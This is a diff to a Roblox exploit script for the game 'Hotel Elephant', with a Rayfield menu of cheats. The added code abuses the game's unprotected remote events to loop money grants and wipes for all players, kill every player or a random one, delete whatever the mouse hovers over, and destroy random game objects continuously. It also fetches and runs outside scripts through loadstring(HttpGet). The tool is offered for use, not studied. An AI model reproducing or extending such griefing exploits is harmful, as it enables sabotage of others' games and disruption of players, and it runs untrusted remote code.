@@ -1,13 +1,23 @@
 -- src/bin/hotels/elephant (Hotel Elephant)
-
+local player = game.Players.LocalPlayer -- Preparius
+local mouse = player:GetMouse()
+local CollectionService = game:GetService("CollectionService")
 local snd2 = Instance.new("Sound")
 snd2.SoundId = "rbxassetid://5772117110"
 snd2.Parent = workspace
 snd2:Play()
 
-task.wait(3.792)
 
-local blacklists = {}
+local blacklists = {chipcre8}
+
+for _,pl in pairs(game:GetService("Players"):GetPlayers()) do
+    for _,ba in pairs(blacklists) do
+        if pl.Name == ba then
+            game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, pl)
+        end
+    end
+end
+
 
 game:GetService("Players").LocalPlayer.DevEnableMouseLock = true
 
@@ -20,6 +30,7 @@ game.StarterGui:SetCore("SendNotification",{ -- reassurance
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))() -- rayfield menu, basically the entire gui lmao, you should use it
 
 spawn(function()
+    task.wait(3.792)
     local snd = Instance.new("Sound")
     snd.SoundId = "rbxassetid://5772118047"
     snd.Parent = workspace
@@ -110,9 +121,21 @@ local All = Tab:CreateButton({
    end,
 })
 
+local All = Tab:CreateButton({
+   Name = "(Loop) Give everyone money!",
+   Callback = function()
+   while true do
+       task.wait(0.1) -- Setting this to lower will crash low-end devices.
+    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
+        game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, currval, "Cash", v)
+        end
+    end
+   end,
+})
+
 local Slider = Tab:CreateSlider({
    Name = "Amount o' Money!",
-   Range = {0, 1000},
+   Range = {0, 10000000000000000},
    Increment = 10,
    Suffix = "Amount o' money",
    CurrentValue = 500,
@@ -141,6 +164,18 @@ local All = Tab:CreateButton({
    Callback = function()
    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
        game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, fuckval, "Cash", v)
+    end
+   end,
+})
+
+local All = Tab:CreateButton({
+   Name = "(Loop) Fuck everyone's money!",
+   Callback = function()
+   while true do
+       task.wait(0.1) -- Setting this to lower will crash low-end devices.
+    for _,v in pairs(game:GetService("Players"):GetPlayers()) do
+        game:GetService("ReplicatedStorage").MoneyRequest:FireServer(false, fuckval, "Cash", v)
+        end
     end
    end,
 })
@@ -303,6 +338,33 @@ local All = Tab:CreateButton({
    end,
 })
 
+local Section = Tab:CreateSection("Kill Options")
+
+local All = Tab:CreateButton({
+   Name = "Kill all Players!",
+   Callback = function()
+   for _,v in pairs(game:GetService("Players"):GetPlayers()) do
+       for _,a in pairs(workspace:GetChildren()) do
+           if a.Name == v.Name then
+               game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, a.Torso)
+           end
+        end
+    end
+   end,
+})
+
+local All = Tab:CreateButton({
+   Name = "Kill a Random Player!",
+   Callback = function()
+   local ama = game:GetService("Players"):GetPlayers()
+   for _,v in pairs(workspace:GetChildren()) do
+       if v.Name == ama[math.random(#ama)].Name then
+           game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, v.Torso)
+       end
+    end
+   end,
+})
+
 local Section = Tab:CreateSection("Lock Options")
 
 local All = Tab:CreateButton({
@@ -359,7 +421,7 @@ local ColorPicker = Tab:CreateColorPicker({
 
 
 
-local Tab = Window:CreateTab("Others", 4483362458) -- Title, Image
+local Tab = Window:CreateTab("Other Exploiting", 4483362458) -- Title, Image
 local Section = Tab:CreateSection("Scripts")
 local All = Tab:CreateButton({
    Name = "Infinite Yield (EdgeIY)",
@@ -378,5 +440,66 @@ local All = Tab:CreateButton({
    -- -> discord.gg/G4nhhKFyyw <-
     _G.KeyCode = "X"
     loadstring(game:HttpGet("https://shattered-gang.lol/scripts/fe/touch_fling.lua"))()
+   end,
+})
+
+local All = Tab:CreateButton({
+   Name = "Mouse Touch Destroy (RE Scripts)",
+   Callback = function()
+        game.StarterGui:SetCore("SendNotification",{ -- reassurance
+        Title = "loaded lmao";
+        Text = "start hovering and see the effects";
+         Duration = 5;
+})
+    spawn(mouse.Move:Connect(function()
+	
+    if mouse.Target then
+		game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, mouse.Target)
+		return
+	end
+	
+    end))
+   end,
+})
+
+local All = Tab:CreateButton({
+   Name = "Random parts go bye bye (THAT IS LITERALLY THE REAL NAME) (RE Scripts)",
+   Callback = function()
+        game.StarterGui:SetCore("SendNotification",{ -- reassurance
+        Title = "loaded lmao";
+        Text = "rip your game mother fucker";
+         Duration = 5;
+})
+    spawn(function()
+	
+    while true do
+        task.wait(0.01)
+	    game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+        game:GetService("ReplicatedStorage").GuiHandler:FireServer(false, workspace:GetDescendants()[math.random(#workspace:GetDescendants())])
+    end
+	
+    end)
+   end,
+})
+
+local All = Tab:CreateButton({
+   Name = "Rejoin Server (ISSEY SCRIPTS)",
+   Callback = function()
+     game.StarterGui:SetCore("SendNotification",{ -- reassurance
+        Title = "Rejoining!";
+        Text = "Attempting to rejoin..";
+         Duration = 5;
+})
+    game:GetService("TeleportService"):Teleport(game.PlaceId, game:GetService("Players").LocalPlayer)
    end,
 })
